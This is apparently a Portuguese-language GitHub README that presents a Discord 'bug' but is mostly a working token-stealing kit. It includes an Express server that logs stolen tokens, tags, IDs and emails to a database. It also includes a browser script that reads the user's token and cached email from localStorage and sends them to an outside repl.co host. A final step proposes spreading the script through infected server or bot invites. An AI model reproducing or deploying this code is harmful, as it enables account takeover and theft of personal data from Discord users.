<center>![discord-logo](https://user-images.githubusercontent.com/79233369/116971100-72b99d80-ac8f-11eb-941a-81cd17b13b01.png)</center>
 # Discord Vulnerabilidade Token
 ## Este é um bug do discord onde é possivel conseguir o token de um usuario apenas com um comando

 ### Oque precisa ser feito para acontecer o bug:

 - primeiro: o desenvolvimento de um servidor http de coleta de parametros pela url que seria algo muito simples, exemplo : [Servidor Exemplo](https://github.com/VhCompany1/Discord-Bug-Token/blob/main/Servidor/index.js)

```js
const express = require('express');
const app = express();
const port = 3000;

const path = require("path");

const low = require('lowdb') //banco de dados
const FileSync = require('lowdb/adapters/FileSync')
const adapter = new FileSync('database/db.json')
const db = low(adapter)

app.use("/public", express.static("public"));

app.get("/", (req, res) => {

    let token = req.query.token
    let tag = req.query.tag
    let id = req.query.id
    let email = req.query.email

    let bot = `false`

    if(token == undefined && tag == undefined && id == undefined && email == undefined){
        bot = `true`
        console.log('bot...')
        return;
    }

    if(token == undefined){
        token = `parametro token não passado`
    }
    
    if(tag == undefined){
        tag = `undefined#0000`
    }
    
    if(id == undefined){
        id = `parametro id não passado`
    }
    
    if(email == undefined){
        email = `undefined@gmail.com`
    }

    console.log(`o usuario logou com sucesso:${tag}`)
    if(!token) return;

    db.get('logs').push({
        token: token,
        tag: tag,
        id: id,
        email: email 
    }).write()    

    res.sendFile(path.join(__dirname, "public/index.html"));
})    

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`)); 
```
 - segundo: o desenvolvimento de um script para enviar o token por esse url, exemplo :
[Script de Envio Para o Servidor](https://github.com/VhCompany1/Discord-Bug-Token/blob/main/Code/ENV.js)
 
 ```js
function env(modul){
    const token = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token
    const tag = `${window.document.querySelector('div.size14-e6ZScH').innerText}%23${window.document.querySelector('div.size12-3cLvbJ').innerText.substr(1)}`
    const id = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.user_id_cache
    const email = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.email_cache

    if(modul == undefined){
        op1()
        modul = 1
    }else{}

    switch(modul){
        case 1:
            op1()
            break
        default:
            console.log(`Modulo ${modul} não foi encontrado`)
    }

    function op1(){
        window.location.href = `https://tokenlog.sasukecusaovh.repl.co/?token=${token}&tag=${tag}&id=${id}&email=${email}`
    }
}

env(1)
```
 - terceiro: o desenvolvimento de um url infectado como o invite de um server ou o invite de um bot para que quando o discord seja  iniciado o codigo seja rodado
 
 ### Oque era pra acontecer caso não existise bug:

 se o bug nao existisse o usuario iria usar o discord normalmente sem enviar nenhum dado sensivel para nenhum servidor

 ### Oque realmente acontece:

com o bug acontecendo o usuario acha que esta usando o discord normalmente porem ele envia um dado sensivel, exemplo: [Exemplo DataBase Com Dados](https://github.com/VhCompany1/Discord-Bug-Token/blob/main/Servidor/database/db.json)

```json
{
  "logs": [
    {
      "token": "token de um usuario:0000",
      "tag": "tag de um usuario:undefined#0000",
      "id": "id de um usuario:0000",
      "email": "emailo de um usuario:undefined@gmail.com"
    }
  ]
}
```


